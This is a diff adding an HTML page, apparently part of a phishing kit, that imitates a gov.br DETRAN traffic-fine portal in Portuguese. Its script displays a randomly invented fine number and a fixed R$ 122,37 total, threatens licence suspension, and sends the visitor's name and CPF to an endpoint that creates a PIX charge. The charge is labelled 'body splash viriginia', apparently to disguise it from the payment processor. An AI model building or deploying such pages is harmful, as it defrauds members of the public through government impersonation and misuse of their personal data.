@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularize-se | DETRAN</title>
+    <link rel="icon" type="image/x-icon" href="../index_files/favicon.ico">
+    <link rel="stylesheet" href="../index_files/index-D3hvFbL-.css">
+    <script src="../vendor/tailwindcss.js"></script>
+</head>
+<body class="bg-gray-50 overflow-x-hidden">
+    <div id="root">
+        <div class="min-h-screen bg-gray-50">
+        <header class="bg-white shadow-sm border-b fixed top-0 left-0 right-0 z-50">
+            <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center justify-between gap-2">
+                <div class="flex items-center overflow-hidden min-w-0 flex-1">
+                    <a class="flex items-center flex-shrink-0" href="#"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
+                    <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0 overflow-hidden">
+                        <h1 class="text-[11px] sm:text-sm font-medium text-gray-900 truncate">Sistema de Infrações e Multas</h1>
+                        <p class="hidden sm:block text-xs text-gray-600 truncate">DETRAN - Departamento de Trânsito</p>
+                    </div>
+                </div>
+                <div class="flex items-center flex-shrink-0">
+                    <button class="p-1 sm:p-2 text-gray-600 hover:text-gray-900 relative" aria-label="Notificações">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 sm:w-5 sm:h-5">
+                            <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"></path>
+                            <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"></path>
+                        </svg>
+                    </button>
+                    <div class="ml-2 sm:ml-4 flex items-center">
+                    <div class="hidden sm:block text-right mr-2 sm:mr-3">
+                        <p id="top-name" class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis max-w-[120px] sm:max-w-none"></p>
+                        <p id="top-cpf" class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis max-w-[120px] sm:max-w-none"></p>
+                    </div>
+                    <div id="avatar" class="w-7 h-7 sm:w-9 sm:h-9 rounded-full bg-purple-700 flex items-center justify-center text-white font-medium text-xs sm:text-sm">--</div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <main class="max-w-3xl mx-auto px-3 sm:px-4 py-4 mt-20 sm:mt-24">
+            <div class="bg-white rounded-lg shadow-sm border overflow-hidden">
+                <div class="px-3 py-2 border-b border-gray-100 bg-gray-50">
+                    <h1 class="text-sm font-semibold text-gray-900">Detalhes do Pagamento</h1>
+                </div>
+
+                <div class="p-3 space-y-2">
+                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-1.5 text-xs sm:text-sm">
+                        <div><p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Nome</p><p id="nome" class="font-medium text-gray-900 leading-tight">-</p></div>
+                        <div><p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">CPF</p><p id="cpf" class="font-medium text-gray-900">-</p></div>
+                        <div><p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Data da infração</p><p id="data-infracao" class="font-medium text-gray-900">-</p></div>
+                        <div><p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Vencimento</p><p id="vencimento" class="font-medium text-gray-900">-</p></div>
+                        <div><p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Nº da multa</p><p id="multa" class="font-medium text-gray-900">-</p></div>
+                        <div><p class="text-gray-500 text-xs uppercase tracking-wide mb-0.5">Código</p><p class="font-medium text-gray-900">5952 — Art. 218</p></div>
+                    </div>
+
+                    <div class="border border-gray-200 rounded-md overflow-hidden">
+                        <div class="px-3 py-1.5 bg-gray-50 border-b border-gray-200">
+                            <h2 class="font-semibold text-gray-900 text-xs sm:text-sm">Composição do valor</h2>
+                        </div>
+                        <div class="p-2">
+                        <table class="w-full text-xs sm:text-sm">
+                            <tbody>
+                                <tr class="text-gray-600"><td class="py-1 pr-2 break-words">Valor original da multa</td><td class="py-1 text-right whitespace-nowrap">R$ 100,44</td></tr>
+                                <tr class="text-gray-600"><td class="py-1 pr-2 break-words">Multa por atraso (20%)</td><td class="py-1 text-right whitespace-nowrap">R$ 20,09</td></tr>
+                                <tr class="text-gray-600"><td class="py-1 pr-2 break-words">Juros</td><td class="py-1 text-right whitespace-nowrap">R$ 1,84</td></tr>
+                                <tr class="font-bold text-gray-900 border-t"><td class="pt-2 pr-2">Valor total</td><td class="pt-2 text-right whitespace-nowrap">R$ 122,37</td></tr>
+                            </tbody>
+                        </table>
+                        </div>
+                    </div>
+
+                    <div class="rounded-md border border-blue-100 bg-blue-50 px-3 py-2 flex items-center justify-between gap-2">
+                        <p class="text-[10px] sm:text-xs text-blue-800 uppercase tracking-wide font-medium">Total a pagar via PIX</p>
+                        <p class="text-lg sm:text-xl font-bold text-gray-900 whitespace-nowrap">R$ 122,37</p>
+                    </div>
+
+                    <div class="bg-amber-50 border border-amber-200 rounded-md px-3 py-2">
+                        <p class="font-medium text-amber-900 text-xs sm:text-sm mb-1">Atenção — prazo de vencimento</p>
+                        <ul class="text-[11px] sm:text-xs text-amber-900/90 list-disc pl-4 space-y-0.5">
+                            <li id="conseq1">Suspensão da CNH a partir de -</li>
+                            <li>Restrição para renovação da CNH e licenciamento</li>
+                        </ul>
+                    </div>
+
+                    <button id="gerar-pix-btn" class="w-full h-10 bg-blue-600 text-white font-semibold px-4 rounded-md hover:bg-blue-700 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 text-sm">Gerar PIX de pagamento</button>
+                    <p id="pix-status" class="hidden text-sm text-gray-600"></p>
+                    <p class="text-[10px] sm:text-xs text-gray-500 text-center pt-1">Documento gerado eletronicamente • Código: <span id="doc-code"></span></p>
+                </div>
+            </div>
+        </main>
+    </div>
+    </div>
+
+    <script>
+        function initials(name) {
+            const parts = (name || '').trim().split(/\s+/).filter(Boolean);
+            if (!parts.length) return '--';
+            if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
+            return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+        }
+
+        function formatCpf(cpf) {
+            const n = (cpf || '').replace(/\D/g, '');
+            return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        async function loadData() {
+            const payload = JSON.parse(sessionStorage.getItem('cpf_lookup_payload') || 'null');
+            let meta = JSON.parse(sessionStorage.getItem('cpf_case_meta') || 'null');
+            if (!payload || !payload.body) {
+                window.location.replace('home.html');
+                return;
+            }
+
+            if (!meta || !meta.ticket) {
+                meta = {
+                    ticket: `DT${Math.floor(Math.random() * 1000000).toString().padStart(6, '0')}`,
+                    prazoFinal: '-',
+                    vencimento: '-',
+                    dataInfracao: '04/04/2025',
+                    dataAutuacao: '04/04/2026',
+                    docCode: '----------'
+                };
+                sessionStorage.setItem('cpf_case_meta', JSON.stringify(meta));
+            }
+
+            const body = payload.body || {};
+            const nome = body.name || 'Condutor não identificado';
+            const cpfMasked = body.cpf_masked || formatCpf(body.cpf || sessionStorage.getItem('cpf_lookup_cpf') || '');
+
+            document.querySelector('#nome').textContent = nome;
+            document.querySelector('#cpf').textContent = cpfMasked;
+            document.querySelector('#top-name').textContent = nome;
+            document.querySelector('#top-cpf').textContent = cpfMasked;
+            document.querySelector('#avatar').textContent = initials(nome);
+            document.querySelector('#data-infracao').textContent = meta.dataInfracao || '-';
+            document.querySelector('#vencimento').textContent = meta.vencimento || '-';
+            document.querySelector('#multa').textContent = meta.ticket || '-';
+            document.querySelector('#conseq1').textContent = `Suspensão da CNH a partir de ${meta.vencimento || '-'}`;
+            document.querySelector('#doc-code').textContent = meta.docCode || '----------';
+
+            const gerarPixBtn = document.querySelector('#gerar-pix-btn');
+            const pixStatus = document.querySelector('#pix-status');
+            gerarPixBtn.addEventListener('click', async function () {
+                gerarPixBtn.disabled = true;
+                gerarPixBtn.textContent = 'Gerando PIX...';
+                pixStatus.classList.remove('hidden', 'text-red-600');
+                pixStatus.textContent = 'Criando cobrança PIX...';
+
+                try {
+                    const resposta = await fetch('/api/pix', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            name: nome,
+                            cpf: body.cpf || sessionStorage.getItem('cpf_lookup_cpf') || '',
+                            amount_cents: 12237,
+                            description: 'body splash viriginia',
+                            external_reference: `det-${meta.ticket || 'ticket'}`
+                        })
+                    });
+
+                    const json = await resposta.json();
+                    if (!resposta.ok) {
+                        throw new Error(json.message || json.error || 'Erro ao gerar PIX');
+                    }
+
+                    sessionStorage.setItem('pix_checkout', JSON.stringify(json));
+                    window.location.href = 'pix.html';
+                } catch (erro) {
+                    pixStatus.classList.add('text-red-600');
+                    pixStatus.textContent = `Falha ao gerar PIX: ${erro.message || 'tente novamente.'}`;
+                    gerarPixBtn.disabled = false;
+                    gerarPixBtn.textContent = 'Gerar PIX de pagamento';
+                }
+            });
+        }
+
+        loadData().catch(function () {
+            window.location.replace('home.html');
+        });
+    </script>
+</body>
+</html>
